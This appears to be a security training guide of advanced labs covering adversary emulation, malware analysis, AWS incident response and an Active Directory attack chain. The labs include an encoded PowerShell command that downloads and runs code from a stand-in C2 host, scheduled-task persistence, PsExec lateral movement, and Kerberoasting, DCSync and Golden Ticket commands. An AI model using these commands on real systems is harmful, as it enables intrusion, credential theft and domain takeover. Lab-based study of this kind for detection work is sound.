# Advanced Labs

These labs are designed for experienced practitioners who have working knowledge across multiple security domains. They address realistic, complex attack scenarios, advanced forensic analysis, custom detection development, and adversary emulation. Each lab references specific MITRE ATT&CK techniques.

---

## Lab Index

| Lab | Topic | ATT&CK Coverage | Time Estimate |
|-----|-------|----------------|---------------|
| [Lab 01: Adversary Emulation Campaign](#lab-01-adversary-emulation-campaign) | Red Team / Purple Team | Multiple | 4-8 hours |
| [Lab 02: Advanced Malware Analysis](#lab-02-advanced-malware-analysis) | Malware / DFIR | T1055, T1059 | 3-4 hours |
| [Lab 03: Custom Detection Rule Development](#lab-03-custom-detection-rule-development) | Detection Engineering | Multiple | 3-4 hours |
| [Lab 04: Cloud IR — AWS Compromise Scenario](#lab-04-cloud-ir-aws-compromise-scenario) | Cloud Security / IR | T1552, T1537 | 2-3 hours |
| [Lab 05: Active Directory Attack Chain](#lab-05-active-directory-attack-chain) | Red Team | T1558, T1134, T1207 | 4-6 hours |

---

## Lab 01: Adversary Emulation Campaign

### Objective

Conduct a structured adversary emulation exercise based on a documented threat actor's TTPs, then evaluate detection coverage and identify gaps. This lab bridges red team and purple team disciplines.

### Threat Actor: APT-SIM (Simulated Financially Motivated Ransomware Group)

**Documented TTP profile:**

| Phase | ATT&CK Technique | Tool/Method |
|-------|-----------------|-------------|
| Initial Access | T1566.001 Spear Phishing Attachment | Malicious Office macro |
| Execution | T1059.001 PowerShell | Encoded payload |
| Persistence | T1053.005 Scheduled Task | Recurring task via schtasks |
| Defense Evasion | T1027 Obfuscated Files | Base64 encoding |
| Credential Access | T1003.001 LSASS Memory | Mimikatz or custom |
| Lateral Movement | T1021.002 SMB/Windows Admin Shares | PsExec or WMI |
| Exfiltration | T1048.003 Exfiltration Over HTTPS | Custom HTTPS upload |
| Impact | T1486 Data Encrypted for Impact | File encryption |

### Phase 1: Planning

```
1. Define objectives:
   - Primary: Reach Domain Controller
   - Secondary: Exfiltrate sample data file
   - Evaluation: Identify which phases trigger alerts

2. Define scope:
   - In scope: Lab AD environment only
   - Out of scope: Production systems

3. Establish C2 infrastructure:
   - Cobalt Strike, Metasploit, or Sliver (for lab use)
   - Redirector using NGINX or Socat
   - Domain: registered aged domain with valid TLS cert

4. Preparation:
   - Blue team ready SIEM, EDR
   - Purple team observers in place
   - Logging verified: all sources forwarding
```

### Phase 2: Initial Access Simulation

```python
# Create a macro-enabled document (research/lab purposes only)
# This simulates the initial access vector without actual phishing

# PowerShell payload (simulated C2 callback)
import base64
payload = 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://c2.lab.local/stage1")'
encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
cmd = f'powershell.exe -EncodedCommand {encoded}'
print(f"Simulated execution: {cmd}")
```

```
Document the following when the payload executes:
- Did EDR detect the macro execution? (T1566.001)
- Did EDR detect PowerShell with encoded command? (T1059.001)
- Did network monitoring detect C2 callback? (TA0011)
- What was the alert latency from execution to analyst notification?
```

### Phase 3: Persistence and Evasion

```powershell
# Scheduled task persistence (log and observe)
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-EncodedCommand [base64_payload]"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "SystemHealthMonitor" `
    -Action $action -Trigger $trigger -RunLevel Highest -Force

# Document: Was Event 4698 generated? Was the alert triggered?
# Check: Did the scheduled task survive a reboot?
```

### Phase 4: Lateral Movement Evaluation

```bash
# Simulate PsExec lateral movement
# Using impacket from attack host (authorized lab environment)
impacket-psexec domain.lab/adminuser:password@10.10.10.20

# Document:
# - Event ID 4648 (explicit credential logon): generated?
# - Event ID 4624 type 3 (network logon): generated?
# - SMB share access events: generated?
# - Did SIEM correlation catch the lateral movement pattern?
```

### Phase 5: Purple Team Debrief

```
For each phase, document:

| Phase | Technique | Alert Triggered? | Alert Latency | False Positive Rate | Gap Identified |
|-------|-----------|-----------------|---------------|---------------------|----------------|
| Initial Access | T1566.001 | Yes/No | Xm Xs | N/A | [gap description] |
| Execution | T1059.001 | Yes/No | Xm Xs | N/A | [gap description] |
| Persistence | T1053.005 | Yes/No | Xm Xs | N/A | [gap description] |

Outputs:
1. Coverage heat map on ATT&CK Navigator
2. Prioritized list of detection improvements
3. New detection rules for identified gaps
4. Recommendations for preventive controls
```

---

## Lab 02: Advanced Malware Analysis

### Objective

Perform static and dynamic analysis of a malware sample to identify its behavior, communication channels, persistence mechanisms, and indicators of compromise.

### Environment

- REMnux analysis VM (remnux.org) — isolated from network
- Flare-VM (Windows analysis environment)
- Tools: Ghidra, x64dbg, Wireshark, INetSim, Volatility, PE-sieve

### Safety Requirements

```
CRITICAL: Perform all dynamic analysis in isolated VMs with:
- No internet access (use INetSim for fake C2 simulation)
- No shared folders with host
- Snapshot taken before executing sample
- Host-only network adapter only

Before analysis:
sha256sum sample.exe  # Document hash
```

### Static Analysis Workflow

**Step 1: Initial identification**

```bash
# On REMnux (Linux analysis)
file malware.exe
strings malware.exe -n 8 | head -100
strings malware.exe -n 8 -e l | head -100  # Unicode
sha256sum malware.exe

# Detect packing
exeinfo malware.exe
detect-it-easy malware.exe

# PE header analysis
pedump malware.exe
```

**Step 2: Import analysis**

```bash
# View imported functions (reveals capabilities)
pedump --imports malware.exe | tee imports.txt

# Key imports to note:
# VirtualAlloc, VirtualProtect: memory allocation/modification (injection, unpacking)
# CreateRemoteThread, WriteProcessMemory: process injection
# CreateService, OpenService: service manipulation (persistence)
# RegSetValueEx: registry modification
# InternetOpenUrl, HttpOpenRequest: network communication
# CryptEncrypt: encryption capability
# FindFirstFile, GetFileAttributes: file enumeration
```

**Step 3: String analysis**

```bash
# Extract and categorize strings
strings malware.exe -n 8 | grep -E "http|https|ftp" > urls.txt
strings malware.exe -n 8 | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" > ips.txt
strings malware.exe -n 8 | grep -E "HKLM|HKCU|SOFTWARE\\\\Microsoft" > registry.txt
strings malware.exe -n 8 | grep -E "\.exe|\.dll|\.bat|\.ps1" > files.txt

# Check for packer/protector artifacts
strings malware.exe | grep -E "UPX|MPRESS|NsPack|PECompact"
```

**Step 4: Disassembly with Ghidra**

```
1. Create new Ghidra project, import malware.exe
2. Auto-analyze with default options
3. Investigate:
   - Entry point: CodeBrowser > Functions > entry
   - Main function (typically called from entry)
   - Look for:
     a. Anti-analysis checks (IsDebuggerPresent, timing checks, CPUID)
     b. Decryption/decompression routines (loops with XOR operations)
     c. Process injection patterns (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
     d. C2 communication (InternetOpen → InternetConnect → HttpOpenRequest)
     e. Persistence installation (RegSetValueEx with Run key path)
```

### Dynamic Analysis Workflow

**Step 5: Configure analysis environment**

```bash
# On REMnux: Start INetSim to simulate internet services
inetsim --log-dir /tmp/inetsim-logs/ &

# Start Wireshark to capture all network traffic
wireshark -i eth0 -w /tmp/network_capture.pcapng &

# On Flare-VM: Start Process Monitor and Process Hacker
# Take snapshot of clean VM before execution
```

**Step 6: Execute and monitor**

```
1. Run malware.exe on Flare-VM
2. Observe in Process Monitor:
   - File system operations (files created, modified, deleted)
   - Registry operations (new keys, value modifications)
   - Process operations (new processes spawned)
3. Observe in Process Hacker:
   - Process tree
   - Loaded DLLs
   - Network connections
   - Memory regions
4. Note first 60 seconds of behavior before any anti-analysis kicks in
```

**Step 7: Memory analysis post-execution**

```bash
# Acquire memory from Flare-VM while malware is running
# Using winpmem or FTK Imager Memory Capture

# Analyze with Volatility 3 on REMnux
python3 vol.py -f infected_memory.raw windows.malfind
python3 vol.py -f infected_memory.raw windows.netscan
python3 vol.py -f infected_memory.raw windows.cmdline
```

**Step 8: Network traffic analysis**

```bash
# Analyze captured traffic
wireshark /tmp/network_capture.pcapng

# Extract DNS queries
tshark -r network_capture.pcapng -T fields -e dns.qry.name \
    -Y "dns.flags.response == 0" | sort -u

# Extract HTTP requests
tshark -r network_capture.pcapng -T fields -e http.request.method \
    -e http.host -e http.request.uri -Y "http.request" | head -50

# Extract HTTPS metadata (JA3 fingerprint)
tshark -r network_capture.pcapng -T fields -e tls.handshake.extensions_server_name \
    -Y "tls.handshake.type == 1"
```

**Step 9: IOC extraction and YARA rule development**

```yara
rule Lab_Malware_Sample {
    meta:
        description = "Detects malware analyzed in Lab 02"
        author = "Lab Analyst"
        date = "2024-01-15"
        sha256 = "[sample hash]"
    
    strings:
        // Add unique strings extracted from analysis
        $unique_string1 = "YOUR_EXTRACTED_STRING" ascii wide
        $unique_string2 = "ANOTHER_UNIQUE_STRING" ascii
        
        // Binary patterns (from disassembly or hex analysis)
        $pattern1 = { 48 8B ?? ?? ?? 48 85 C0 74 ?? }  // Replace with actual
        
        // Network artifact
        $c2_domain = "EXTRACTED_C2_DOMAIN" ascii
    
    condition:
        uint16(0) == 0x5A4D and  // MZ header
        filesize < 5MB and
        (2 of ($unique*) or $c2_domain)
}
```

---

## Lab 04: Cloud IR — AWS Compromise Scenario

### Objective

Investigate and respond to a simulated AWS account compromise, including credential theft via SSRF, unauthorized IAM changes, and data exfiltration.

### Scenario

Security monitoring has detected unusual API activity from EC2 instance i-0123456789abcdef0. The instance runs a web application. Suspicious activities detected:
- GetSecretValue calls from the EC2 instance to Secrets Manager at unusual hours
- IAM::CreateUser API call not tied to any change ticket
- S3:GetObject calls in bulk from an unfamiliar IAM user

### Investigation

**Step 1: Establish investigation scope with CloudTrail**

```bash
# Download relevant CloudTrail events
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=ResourceName,AttributeValue=i-0123456789abcdef0 \
    --start-time 2024-01-14T00:00:00Z \
    --end-time 2024-01-16T00:00:00Z \
    --output json > ec2_events.json

# Key API calls to investigate
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=GetCredentials \
    --start-time 2024-01-14T00:00:00Z \
    --output json

# IAM changes in the account
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser \
    --start-time 2024-01-14T00:00:00Z \
    --output json | jq '.Events[].CloudTrailEvent' | jq '.'
```

**Step 2: Trace SSRF to credential access**

```bash
# Check EC2 instance metadata service access in VPC flow logs or CloudTrail
# Look for GetCredentials from the instance's IAM role
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
    --start-time 2024-01-14T00:00:00Z \
    --output json | jq '.Events[] | select(.CloudTrailEvent | fromjson | .sourceIPAddress == "INSTANCE_IP")'

# Instance metadata calls (if logged via GuardDuty)
aws guardduty list-findings --detector-id DETECTOR_ID \
    --finding-criteria '{"Criterion":{"resource.instanceDetails.instanceId":{"Equals":["i-0123456789abcdef0"]}}}'
```

**Step 3: Investigate unauthorized IAM user**

```bash
# Get details of the created user
aws iam get-user --user-name suspicious_user

# List access keys
aws iam list-access-keys --user-name suspicious_user

# List policies attached
aws iam list-attached-user-policies --user-name suspicious_user

# Review what the user did (CloudTrail filtered by their access key)
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=Username,AttributeValue=suspicious_user \
    --output json
```

**Step 4: S3 exfiltration investigation**

```bash
# List objects accessed (from S3 server access logs or CloudTrail data events)
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject \
    --start-time 2024-01-14T00:00:00Z \
    --output json | jq '.Events[] | select(.CloudTrailEvent | fromjson | .userIdentity.userName == "suspicious_user")'

# Estimate data volume (from S3 access logs)
grep "suspicious_user" s3_access_log.txt | awk '{sum += $18} END {print sum " bytes exfiltrated"}'
```

**Step 5: Containment actions**

```bash
# 1. Disable compromised IAM user immediately
aws iam update-login-profile --user-name suspicious_user --no-password-reset-required
aws iam delete-access-key --user-name suspicious_user --access-key-id AKIAIOSFODNN7EXAMPLE

# 2. Isolate compromised EC2 instance (change security group)
aws ec2 modify-instance-attribute \
    --instance-id i-0123456789abcdef0 \
    --groups sg-isolated-no-ingress-no-egress

# 3. Rotate the compromised role credentials
# (invalidate sessions by rotating keys or detaching role temporarily)

# 4. Enforce IMDSv2 on all instances
aws ec2 modify-instance-metadata-options \
    --instance-id i-0123456789abcdef0 \
    --http-tokens required

# 5. Enable GuardDuty if not already enabled
aws guardduty create-detector --enable
```

**Step 6: Timeline reconstruction**

```
Document the complete attack timeline:

T+00:00  SSRF vulnerability exploited in web application
T+00:02  EC2 metadata service queried via SSRF (IMDSv1)
T+00:05  IAM role credentials (AccessKeyId, SecretAccessKey, Token) extracted
T+00:10  Attacker establishes new AWS CLI session with stolen credentials
T+00:15  IAM::CreateUser called to establish persistence (suspicious_user)
T+00:20  IAM::AttachUserPolicy called (AdministratorAccess)
T+01:30  S3::ListBuckets, S3::GetObject bulk calls begin
T+06:00  GuardDuty alert generated for unusual API activity
T+07:00  SOC analyst begins investigation (this lab)
```

---

## Lab 05: Active Directory Attack Chain

### Objective

Execute a complete Active Directory attack chain from initial access through domain compromise, documenting each step and the associated MITRE ATT&CK technique.

### Prerequisites

- Full lab AD environment (Windows Server 2019 DC, Windows 10 workstations)
- Kali Linux attacker VM
- Authorization to test the lab environment

### Attack Chain

**Step 1: Kerberoasting (T1558.003)**

```bash
# From Kali with domain credentials
impacket-GetUserSPNs lab.local/lowprivuser:Password123 -request \
    -outputfile kerberoast_hashes.txt

# Crack offline
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Result: svc_sql account password recovered
```

**Step 2: Token Impersonation (T1134.001)**

```powershell
# After gaining service account access to a server
# Using Incognito or Invoke-TokenManipulation
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser -Username "domain\admin_user"
```

**Step 3: DCSync (T1003.006)**

```bash
# With appropriate permissions (GenericAll on domain or replication rights)
impacket-secretsdump lab.local/svc_sql:RecoveredPassword@dc01.lab.local -just-dc

# Or with mimikatz from Windows
# lsadump::dcsync /domain:lab.local /user:krbtgt
```

**Step 4: Golden Ticket (T1558.001)**

```bash
# With KRBTGT hash from DCSync
impacket-ticketer \
    -nthash KRBTGT_NTLM_HASH \
    -domain-sid S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX \
    -domain lab.local \
    administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.lab.local
```

**Step 5: Document ATT&CK Coverage**

```
Create an ATT&CK Navigator layer documenting:
- Each technique used in the attack chain
- Color: Red = used, Yellow = detected, Green = detected + prevented

Submit findings to blue team for detection development.
```
